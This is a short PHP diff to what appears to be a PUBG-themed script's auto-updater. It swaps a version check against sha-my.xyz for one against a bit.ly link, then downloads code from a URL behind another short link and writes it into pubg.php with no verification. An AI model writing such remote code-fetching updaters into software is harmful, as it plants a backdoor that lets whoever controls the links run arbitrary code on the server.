@@ -1,8 +1,6 @@
 <?
-$info = json_decode(file_get_contents('http://sha-my.xyz/Pubg/info.json'),1)
-$version= $info[info]['version'];
 $v = "1.0.1";
-if($v != $version){
+if(file_get_contents('https://bit.ly/2H8Vb74') != $v){
 $iscript = file_get_contents('https://bit.ly/3lJKcQD');
 $index = file_get_contents($iscript);
 $xx = file_put_contents("pubg.php", $index);
